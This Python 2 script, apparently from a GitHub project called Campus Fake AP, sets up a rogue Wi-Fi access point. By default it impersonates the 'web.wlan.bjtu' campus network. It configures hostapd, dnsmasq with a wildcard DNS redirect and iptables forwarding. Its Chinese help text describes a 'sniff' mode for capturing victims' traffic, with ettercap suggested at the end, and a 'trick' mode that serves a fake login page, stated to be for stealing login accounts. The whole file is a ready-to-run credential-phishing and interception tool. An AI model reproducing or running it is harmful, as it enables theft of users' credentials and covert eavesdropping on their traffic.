#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from subprocess import check_output
import logging
import argparse
import fcntl

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

NETWORK_IP = "10.0.0.0"
NETWORK_MASK = "255.255.255.0"
NETWORK_GW_IP = "10.0.0.1"
DHCP_LEASE = "10.0.0.2,10.0.0.100,12h"

DN = open(os.devnull, 'w')

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray
T = '\033[93m'  # tan


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-c",
        "--channel",
        help="选择伪AP所在channel，默认为1",
        default="1"
    )
    parser.add_argument(
        "-i",
        "--interface",
        help="选择网卡接口 栗子: -i wlan0"
    )
    parser.add_argument(
        "-e",
        "--essid",
        help="AP的essid，默认为'web.wlan.bjtu'"
    )
    parser.add_argument(
        "-m",
        "--mode",
        help="sniff 嗅探模式：无登录，wifi网络联通，可用于嗅探数据\n" +
             "trick 欺骗模式：挂出虚假登陆网页：wifi网络不联通，可用于窃取登录账号"
    )
    parser.add_argument(
        "-t",
        "--time",
        help="热点开放时间(小时) 栗子： -t 5"
    )
    return parser.parse_args()


def get_hostapd():
    if not os.path.isfile('/usr/sbin/hostapd'):
        install = raw_input(
            ('[' + T + '*' + W + '] hostapd not found ' +
             'in /usr/sbin/hostapd, install now? [y/n] ')
        )
        if install == 'y':
            os.system('apt-get -y install hostapd')
        else:
            sys.exit(('[' + R + '-' + W + '] hostapd' +
                      'not found in /usr/sbin/hostapd'))
    if not os.path.isfile('/usr/sbin/hostapd'):
        sys.exit((
            '\n[' + R + '-' + W + '] Unable to install the \'hostapd\' package!\n' +
            '[' + T + '*' + W + '] This process requires a persistent internet connection!\n' +
            'Please follow the link below to configure your sources.list\n' +
            B + 'http://docs.kali.org/general-use/kali-linux-sources-list-repositories\n' + W +
            '[' + G + '+' + W + '] Run apt-get update for changes to take effect.\n' +
            '[' + G + '+' + W + '] Rerun the script again to install hostapd.\n' +
            '[' + R + '!' + W + '] Closing'
        ))


def shutdown():
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('pkill airbase-ng')
    os.system('pkill dnsmasq')
    os.system('pkill hostapd')
    os.system('sudo apachectl stop')
    if os.path.isfile('/tmp/hostapd.conf'):
        os.remove('/tmp/hostapd.conf')
    reset_interfaces()
    print '\n[' + R + '!' + W + '] Closing'
    sys.exit(0)


def get_interfaces():
    interfaces = {"monitor": [], "managed": [], "all": []}
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0:
            continue  # Isn't an empty string
        if line[0] != ' ':  # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search:  # Isn't wired
                iface = line[:line.find(' ')]  # is the interface
                if 'Mode:Monitor' in line:
                    interfaces["monitor"].append(iface)
                elif 'IEEE 802.11' in line:
                    interfaces["managed"].append(iface)
                interfaces["all"].append(iface)
    return interfaces


def reset_interfaces():
    monitors = get_interfaces()["monitor"]
    for m in monitors:
        if 'mon' in m:
            Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
        else:
            Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
            Popen(['iwconfig', m, 'mode', 'managed'], stdout=DN, stderr=DN)
            Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)


def get_mac(mon_iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print ('[' + G + '*' + W + '] Monitor mode: ' + G
           + mon_iface + W + ' - ' + O + mac + W)
    return mac


def start_ap(mon_iface, channel, essid, args=None):
    print '[' + T + '*' + W + '] Starting the fake access point...'
    config = (
        'interface=%s\n'
        'driver=nl80211\n'
        'ssid=%s\n'
        'hw_mode=g\n'
        'channel=%s\n'
        'macaddr_acl=0\n'
        'ignore_broadcast_ssid=0\n'
    )
    with open('/tmp/hostapd.conf', 'w') as dhcpconf:
        dhcpconf.write(config % (mon_iface, essid, channel))

    # Popen(['hostapd', '/tmp/hostapd.conf'], stdout=DN, stderr=DN)
    os.system('hostapd /tmp/hostapd.conf &')

    try:
        time.sleep(6)  # Copied from Pwnstar which said it was necessary?
    except KeyboardInterrupt:
        shutdown()


def dhcp_conf(interface):
    config = (
        'no-resolv\n'
        'interface=%s\n'
        'dhcp-range=%s\n'
        'address=/#/%s'
    )

    with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
        dhcpconf.write(config % (interface, DHCP_LEASE, NETWORK_GW_IP))
    return '/tmp/dhcpd.conf'


def dhcp(dhcpconf, mon_iface):
    os.system('echo > /var/lib/misc/dnsmasq.leases')
    dhcp = Popen(['dnsmasq', '-C', dhcpconf], stdout=PIPE, stderr=DN)
    Popen(['ifconfig', str(mon_iface), 'mtu', '1400'], stdout=DN, stderr=DN)
    Popen(
        ['ifconfig', str(mon_iface), 'up', NETWORK_GW_IP,
         'netmask', NETWORK_MASK
         ],
        stdout=DN,
        stderr=DN
    )
    # Make sure that we have set the network properly.
    proc = check_output(['ifconfig', str(mon_iface)])
    if NETWORK_GW_IP not in proc:
        return False
    time.sleep(.5)  # Give it some time to avoid "SIOCADDRT: Network is unreachable"
    os.system(
        ('route add -net %s netmask %s gw %s' %
         (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP))
    )
    return True


def start_mode(interface, mode="monitor"):
    print ('[' + G + '+' + W + '] Starting ' + mode + ' mode off '
           + G + interface + W)
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode %s' % (interface, mode))
        os.system('ifconfig %s up' % interface)
        return interface
    except Exception:
        sys.exit('[' + R + '-' + W + '] Could not start %s mode' % mode)


if __name__ == "__main__":

    print (B + '   [---]           Campus Fake AP            [---]')
    print (B + '   [---]         Created by: Xyntax          [---]')
    print (B + '   [---]            Version: 0.9             [---]')
    print (B + '   [---]    Github: noScript/CampusFakeAp    [---]')
    print (B + '   [---]     Follow me on Github: Xyntax     [---]')


    # 获取用户输入并配置
    args = parse_args()

    channel = '1'
    if args.channel:
        channel = args.channel

    ap_iface = 'wlan0'
    if args.interface:
        ap_iface = args.interface

    essid = 'web.wlan.bjtu'
    if args.essid:
        essid = args.essid


    # 确保权限为root
    if os.geteuid():
        sys.exit('[' + R + '-' + W + '] Please run as root')

    # 检查hostapd 没有自动安装
    get_hostapd()

    os.system('nmcli radio wifi off')
    os.system('rfkill unblock all')

    print '[' + T + '*' + W + ']started DHCP, set up iptables'

    time.sleep(3)

    if args.mode:
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        if args.mode == 'sniff':
            print '[' + T + '*' + W + '] Enter sniff mode ...'
            os.system('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE')
            os.system('iptables -A FORWARD -i ' + ap_iface + ' -o eth0 -j ACCEPT')
            os.system('iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356')
        elif args.mode == 'trick':
            print '[' + T + '*' + W + '] Enter trick mode ...'
            print '[' + T + '*' + W + '] 程序运行结束后请额外开启本机服务器挂网页(懒得实现了^_^) ...'
            print '[' + T + '*' + W + '] 可以使用命令如 sudo apachectl -k start ...'
            time.sleep(1)
            # os.system('sudo apachectl -k start')
        else:
            print '[' + R + '*' + W + '] mode选项出错'
            shutdown()
    else:
        print '[' + R + '*' + W + '] mode选项为必需项'
        shutdown()
    time.sleep(1)

    # Start AP
    mon_iface = get_mac(ap_iface)
    start_ap(ap_iface, channel, essid)

    dhcpconf = dhcp_conf(ap_iface)
    if not dhcp(dhcpconf, ap_iface):
        print('[' + G + '+' + W +
              '] Could not set IP address on %s!' % ap_iface)
        shutdown()
    os.system('clear')
    print ('[' + T + '*' + W + '] ' + T +
           essid + W + ' set up on channel ' +
           T + channel + W + ' via ' + T + mon_iface +
           W + ' on ' + T + str(ap_iface) + W)

    try:
        print('[' + G + '+' + W + ']' + '好啦，客官可以开ettercap嗅探了')
        print('[' + G + '+' + W + ']' + '任何问题请反馈给我哦:xyntax@163.com')
        time.sleep(int(args.time) * 3600)
    except KeyboardInterrupt:
        shutdown()
